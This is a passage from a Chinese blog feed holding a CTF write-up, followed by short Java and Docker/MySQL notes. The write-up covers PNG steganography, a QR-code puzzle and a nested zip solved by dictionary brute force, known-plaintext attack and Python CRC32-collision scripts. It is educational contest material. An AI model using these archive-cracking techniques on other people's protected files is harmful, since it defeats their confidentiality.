src="/2023/04/27/FCTF/image-20230429195803084.png"></p><p>调用popen()方法。</p><p><img src="/2023/04/27/FCTF/image-20230429195958840.png"></p><p>上传文件，获取flag。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="png"><a href="#png" class="headerlink" title="png"></a>png</h4><p>附件下载下来是一张png图片，</p><p><img src="/2023/04/27/FCTF/image-20230430041531911.png"></p><p>010打开划拉到最底部发现冗余数据，部分flag<code>FCTF&#123;To</code>，</p><p><img src="/2023/04/27/FCTF/image-20230430043203297.png"></p><p>010跑PNGTemplate.bt脚本报错，左下提示CRC不匹配，说明修改了高宽却没有修改CRC导致读取报错，图片宽高很可能被修改过。(或者放入kali中无法打开)</p><p><img src="/2023/04/27/FCTF/image-20230430043711587.png"></p><p>进行一个高度的改，将高度640改为700</p><p><img src="/2023/04/27/FCTF/image-20230430044130507.png"></p><p>文件头数据块IHDR包含的第一部分数据就是图片宽高，分别对应第二行中的第一组四个字节和第二组四个字节，掏出计算器算算高度拉长点。</p><p><img src="/2023/04/27/FCTF/image-20230430044803732.png"></p><p>得到另一部分flag：<code>_the_flawless_</code></p><p><img src="/2023/04/27/FCTF/image-20230430045240866.png"></p><p>然后就是做这道题时比较懵逼的一个地方了，招最后一部分flag。先开起zsteg看看能拿到什么吧。查到了之前找到的<code>FCTF&#123;To</code>，但是愣是没发现最后一部分flag，如果有LSB隐写那zsteg也应该能淦出来才对呀？</p><p><img src="/2023/04/27/FCTF/image-20230430045440795.png"></p><p>由于过于依赖工具，死磕这条路坚信不存在lsb隐写。愣是没用Stegsolve手搓，到处找，查IDAT块、翻EXIF信息…最后还得感谢ixout手搓LSB出来。</p><p><img src="/2023/04/27/FCTF/image-20230430050104649.png"> </p><p>呜呜呜呜呜呜呜呜呜呜。</p><p>最后三段flag拼接起来得到flag。</p><p>呜呜呜呜呜呜呜呜呜呜。</p><h4 id="cet6"><a href="#cet6" class="headerlink" title="cet6"></a>cet6</h4><p>一道基础的USB取证题，但是不太常规。。。</p><h4 id="zip套娃"><a href="#zip套娃" class="headerlink" title="zip套娃"></a>zip套娃</h4><p>第一层：</p><p>binwalk无法分离，不是伪加密。没给其他条件明文攻击也不太行，那就爆破试试吧（。</p><p><img src="/2023/04/27/FCTF/image-20230430051023113.png"></p><p>ARCHPR开起来，攻击方式字典，选的是kali字典。跑了一段时间后成功拿到第一层密码。</p><p><img src="/2023/04/27/FCTF/image-20230430130335839.png"></p><p>第二层：</p><p>依然先丢到kali里binwalk试下，分离成功，伪加密</p><p><img src="/2023/04/27/FCTF/image-20230430142037485.png"></p><p>分离出来的东西多了个0.zip打开其实就是第二层的包不过问题不大，直接看第三层的压缩包</p><p><img src="/2023/04/27/FCTF/image-20230430142135922.png"></p><p>第三层：</p><p>打开压缩包看到了一个支点.txt文件，同时第二层解压出来后也有一个支点.txt，支点.txt文件大小大于12字节，大胆猜测是明文攻击。</p><p><img src="/2023/04/27/FCTF/image-20230430144529014.png"></p><p>WinRAR将泄密出来的文件压缩为zip，开始明文攻击，然后就。。。</p><p><img src="/2023/04/27/FCTF/image-20230430144651066.png"></p><p>相信不止我一个人遇到这种情况。。。这里我们忽略了一些细节，加密文件是通过什么方式压缩的呢？不同压缩软件采用的压缩算法也会不同，自然会出现不匹配的情况，这里多尝试几次，鼠标右键发送到压缩文件可行，开始明文攻击</p><p><img src="/2023/04/27/FCTF/image-20230430145433930.png"></p><p><img src="/2023/04/27/FCTF/image-20230430145615362.png"></p><p>等待了一段时间之后拿到秘钥(btw这一坨是啥。。。)</p><p><img src="/2023/04/27/FCTF/image-20230430150510674.png"></p><p>第四层：</p><p>字典、明文、伪加密，各种姿势都试过了，打开压缩包看一眼，分散成这么多小文件，大胆猜测CRC碰撞</p><p><img src="/2023/04/27/FCTF/image-20230430152951249.png"></p><p>EXIF查看一下压缩文件数据，CRC32、字节数等等</p><p><img src="/2023/04/27/FCTF/image-20230430153333151.png"></p><p>大致整理下6个文本文件的CRC32、字节数：</p><table><thead><tr><th align="center">文件名</th><th align="center">CRC32</th><th align="center">字节数</th></tr></thead><tbody><tr><td align="center">1.txt</td><td align="center">0x92716b7c</td><td align="center">5</td></tr><tr><td align="center">2.txt</td><td align="center">0x1ab6bb72</td><td align="center">4</td></tr><tr><td align="center">3.txt</td><td align="center">0xfcf21afd</td><td align="center">3</td></tr><tr><td align="center">4.txt</td><td align="center">0x89a155cb</td><td align="center">5</td></tr><tr><td align="center">5.txt</td><td align="center">0x2d09a3d6</td><td align="center">6</td></tr><tr><td align="center">6.txt</td><td align="center">0xe3f20a9d</td><td align="center">2</td></tr></tbody></table><p>1-3字节的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">1byte</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xda6fd2a0</span>, <span class="hljs-number">0xf6a70</span>, <span class="hljs-number">0x70659eff</span>, <span class="hljs-number">0x862575d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            char_crc = binascii.crc32(char1.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>            calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>            <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将每个字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),char1))<br>                comment += char1<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">2bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                res_char = char1 + char2<span class="hljs-comment">#获取遍历的任意2Byte字符</span><br>                char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将获取到的字符的CRC32值与0xffffffff进行与运算</span><br>                <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                    comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160710583.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">3bytes</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_crc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Start Crack CRC-------------&#x27;</span>)<br>    crc_list = [<span class="hljs-number">0x92716b7c</span>, <span class="hljs-number">0x1ab6bb72</span>, <span class="hljs-number">0xfcf21afd</span>, <span class="hljs-number">0x89a155cb</span>, <span class="hljs-number">0x2d09a3d6</span>, <span class="hljs-number">0xe3f20a9d</span>]<span class="hljs-comment">#文件的CRC32值列表，注意顺序</span><br>    comment = <span class="hljs-string">&#x27;&#x27;</span><br>    chars = string.printable<br>    <span class="hljs-keyword">for</span> crc_value <span class="hljs-keyword">in</span> crc_list:<br>        <span class="hljs-keyword">for</span> char1 <span class="hljs-keyword">in</span> chars:<br>            <span class="hljs-keyword">for</span> char2 <span class="hljs-keyword">in</span> chars:<br>                <span class="hljs-keyword">for</span> char3 <span class="hljs-keyword">in</span> chars:<br>                    res_char = char1 + char2 + char3<span class="hljs-comment">#获取遍历的任意3Byte字符</span><br>                    char_crc = binascii.crc32(res_char.encode())<span class="hljs-comment">#获取遍历字符的CRC32值</span><br>                    calc_crc = char_crc &amp; <span class="hljs-number">0xffffffff</span><span class="hljs-comment">#将遍历的字符的CRC32值与0xffffffff进行与运算</span><br>                    <span class="hljs-keyword">if</span> calc_crc == crc_value:<span class="hljs-comment">#将获取字符的CRC32值与每个文件的CRC32值进行匹配</span><br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(crc_value),res_char))<br>                        comment += res_char<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-----------CRC Crack Completed-----------&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Result: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(comment))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    crack_crc()<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430160744568.png"></p><p>4-6字节的使用<a href="https://github.com/theonlypwner/crc32">theonlypwner</a>工具，修改供选字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">permitted_characters = <span class="hljs-built_in">set</span>(<br>    <span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;!&#x27;</span>))  <span class="hljs-comment"># \w</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/FCTF/image-20230430161138948.png"></p><p><code>FTCF&#123;</code></p><p><img src="/2023/04/27/FCTF/image-20230430161219428.png"></p><p><code>Y0u_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161254433.png"></p><p><code>_z1p_</code></p><p><img src="/2023/04/27/FCTF/image-20230430161318849.png"></p><p><code>master</code></p><p>拼接起来就是<code>FTCF&#123;Y0u_4re_z1p_master!&#125;</code></p><p>使用theonlypwner时出了点问题，最开始忘记了flag中必含的”{“”}”字符，导致怎么都跑不出来，还是看了眼hint想起来应该修改脚本中的供选字符。如果感叹号是在4-6字节的那些文件的话肯定也跑不出来了，考虑问题还是不够周到。</p><p>（大佬的博客：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html">https://www.cnblogs.com/ECJTUACM-873284962/p/9884416.html</a>）</p><p>（CTFwiki：<a href="https://ctf-wiki.org/misc/archive/zip/#_7%EF%BC%89">https://ctf-wiki.org/misc/archive/zip/#_7）</a></p><hr><h2 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h4><p>附件如图所示：</p><p><img src="/2023/04/27/FCTF/image-20230519013136127.png"></p><p>一整张图构成极其简单，想要藏什么数据的话大概率只能是IDAT块隐写了，pngcheck查看下</p><p><img src="/2023/04/27/FCTF/image-20230519013017814.png"></p><p>9个IDAT块，块长度没有隐藏什么特殊信息，一张正常的png图片的IDAT块的前面的块应该都是填充满且相同大小的，这个check结果显然就不正常，感觉每一个块都单独成图。试着删除块。</p><p>tweakpng：</p><p><img src="/2023/04/27/FCTF/image-20230519013824840.png"></p><p>准备删IDAT块，九个块就拷贝九份先。删块的时候不要把IEND块删了，这是png格式的结尾标识。</p><p>每个IDAT块单独成一张图片，已经很明显了，是一张二维码。</p><p><img src="/2023/04/27/FCTF/image-20230519014312145.png"></p><p>自己对于二维码结构的认知只有三个定位块（悲），所以瞎拼，然后都没法扫（，根据学长放的<a href="https://www.cnblogs.com/mq0036/p/14445719.html">hint</a>：</p><p><img src="/2023/04/27/FCTF/image-20230519021831370.png"></p><p><img src="/2023/04/27/FCTF/image-20230519021849222.png"></p><p>归纳就是三个定位块的周围一个像素块的一圈必须是空白的，且相互之间有黑白像素块交叉分布的定时标志，根据特征拿到ps里拼了下</p><p><img src="/2023/04/27/FCTF/image-20230519022132076.png"></p><p>扫一下，拿到flag：</p><p><code>FCTF&#123;n1ce_puzzl3&#125;</code></p><h4 id="自信音游人"><a href="#自信音游人" class="headerlink" title="自信音游人"></a>自信音游人</h4><p>附件是给的曲目选自阿卡伊的だいあるのーと。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>ssrf</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_note</title>
    <link href="/2023/04/24/java-note/"/>
    <url>/2023/04/24/java-note/</url>
    
    <content type="html"><![CDATA[<h1 id="浅记Java学习记录"><a href="#浅记Java学习记录" class="headerlink" title="浅记Java学习记录"></a>浅记Java学习记录</h1><p>JRE：运行Java字节码的虚拟机</p><p>JDK：如果只有Java源码，要编译成Java字节码，就需要JDK，因为JDK除了包含JRE，还提供了编译器、调试器等开发工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ascii"> ┌─    ┌──────────────────────────────────┐<br> │     │     Compiler, debugger, etc.     │<br> │     └──────────────────────────────────┘<br>JDK ┌─ ┌──────────────────────────────────┐<br> │  │  │                                  │<br> │ JRE │      JVM + Runtime Library       │<br> │  │  │                                  │<br> └─ └─ └──────────────────────────────────┘<br>       ┌───────┐┌───────┐┌───────┐┌───────┐<br>       │Windows││ Linux ││ macOS ││others │<br>       └───────┘└───────┘└───────┘└───────┘<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字RCE</title>
    <link href="/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"/>
    <url>/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_note</title>
    <link href="/2023/04/05/docker-note/"/>
    <url>/2023/04/05/docker-note/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker学习记录"><a href="#Docker学习记录" class="headerlink" title="Docker学习记录"></a>Docker学习记录</h1><p>Windows上一定要先安装WSL。</p><h2 id="复现CTF赛题环境"><a href="#复现CTF赛题环境" class="headerlink" title="复现CTF赛题环境"></a>复现CTF赛题环境</h2><p>作为一名CTF萌新，一切的一切的一切先从如何复现环境开始（</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了Dockerfile的情况</span><br>docker build -t &lt;容器名&gt; .#注意这里最后有个&quot;.&quot;不能省略<br>docker run -idP &lt;容器名&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了docker-compose.yml的情况</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service docker status#查看docker运行状态<br>sudo service docker start#启动docker<br></code></pre></td></tr></table></figure><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">run 代表运行一个容器，unbuntu:20.04代表镜像(images)，由ubuntu:20.04镜像创建一个新的容器并运行。后面的/bin/echo代表执行该容器/bin/下的<span class="hljs-built_in">echo</span>命令</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151409875.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu:20.04 /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-i：允许容器内的标准输出进行交互</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t：在新容器内指定一个伪终端或终端</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果不存在该镜像则自动拉取安装一个</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151607565.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入容器之后想退出</span><br>root@&lt;容器ID&gt;:/# exit<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151900721.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-d表示在后台运行</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">上述指令执行完之后并没有回显<span class="hljs-string">&quot;hello world&quot;</span>,而是显示容器的ID，说明容器被启动</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152208455.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps#查看正在运行的容器<br>docker ps -a#查看所有容器<br>docker ps -l#查看最后一次创建的容器<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152453409.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt; #查看容器标准输出<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152752058.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop &lt;ID/容器名&gt;#停止容器<br>docker restart &lt;ID/容器名&gt;#重启容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull &lt;镜像名&gt;#拉取镜像<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -itd --name &lt;容器名&gt; &lt;镜像名&gt; /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">希望容器在后台运行，并给该容器命名</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">要注意的是加上<span class="hljs-string">&quot;-d&quot;</span>默认在后台运行不进入容器，要进入容器用docker attach或docker <span class="hljs-built_in">exec</span></span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153402534.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker attach &lt;ID/容器名&gt;#进入容器，exit后容器停止<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153636733.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it &lt;ID/容器名&gt; /bin/bash#exit之后容器在后台运行不关闭<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153831456.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker export &lt;ID/容器名&gt; &gt; ./ubuntu.tar#向当前目录导出某个容器<br>cat ./ubuntu.tar | docker import -&lt;容器名&gt;:&lt;tag&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm -f &lt;ID/容器名&gt; #删除某容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rename &lt;old_name&gt; &lt;new_name&gt;#重命名某容器<br></code></pre></td></tr></table></figure><h3 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -P training/webapp python app.py<br><span class="hljs-meta prompt_">#</span><span class="language-bash">大写的-P代表随机映射一个端口</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405154618159.png"></p><p>访问本地32768端口</p><p><img src="/2023/04/05/docker-note/image-20230405154729584.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">小写的-p代表指定映射的ip和端口，但是在一个指定端口上只能绑定一个容器</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">格式：hostPort:containerPort、ip:hostPort:containerPort、ip::containerPort</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155352141.png"></p><p>访问本地23333端口</p><p><img src="/2023/04/05/docker-note/image-20230405155430720.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt;#查看截止当前的web应用日志（静态）<br>docker logs -f &lt;ID/容器名&gt;#查看实时web日志（动态）<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155849636.png"></p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi &lt;镜像名&gt;#删除镜像，rmi中的i是images的意思<br>docker images#查看镜像，复现Dockerfile第一步命令后可以用一下看看是否创建成功镜像<br></code></pre></td></tr></table></figure><hr><h2 id="Docker-部署-MySQL"><a href="#Docker-部署-MySQL" class="headerlink" title="Docker 部署 MySQL"></a>Docker 部署 MySQL</h2><p>先pull一个镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker pull mysql<br></code></pre></td></tr></table></figure><p><code>docker images</code>可以查看是否成功拉取镜像</p><p>创建容器并进行端口映射：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p &lt;port&gt;:3306 --name &lt;容器名&gt; -e MYSQL_ROOT_PASSWORD=&lt;密码&gt; mysql</span><br></code></pre></td></tr></table></figure><p><code>docker ps</code>可以查看是否成功创建容器</p><p>启动容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker start &lt;容器名/ID&gt;<br></code></pre></td></tr></table></figure><p>容器启动后，进入容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker exec -it &lt;容器名/ID&gt; /bin/bash<br></code></pre></td></tr></table></figure><p>进入MySQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u root -p &lt;密码&gt;<br></code></pre></td></tr></table></figure><p>修改新密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;&lt;新密码&gt;&#x27;;<br></code></pre></td></tr></table></figure><p>开启MySQL远程连接权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE USER &lt;用户名&gt; IDENTIFIED BY &#x27;&lt;远程密码&gt;&#x27;;#创建远程用户<br>GRANT ALL PRIVILEGES ON *.* TO 